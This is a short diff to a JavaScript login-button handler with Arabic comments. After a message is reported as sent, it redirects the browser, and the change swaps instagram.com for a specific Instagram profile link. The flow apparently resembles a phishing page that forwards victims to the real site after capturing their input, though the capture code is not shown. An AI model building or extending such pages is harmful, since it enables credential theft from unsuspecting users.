@@ -22,7 +22,7 @@ document.getElementById('loginButton').addEventListener('click', function (e) {
       console.log('Message sent successfully:', data);
       
       // إعادة التوجيه بعد نجاح الإرسال
-      window.location.href = "https://instagram.com"; // استبدل بالرابط الذي تريد التحويل إليه
+      window.location.href = "https://www.instagram.com/sudo2fast?igsh=MThnZzUyY2JudmJpZQ=="; // استبدل بالرابط الذي تريد التحويل إليه
     })
     .catch(function(error) {
       console.error('Error sending message:', error);
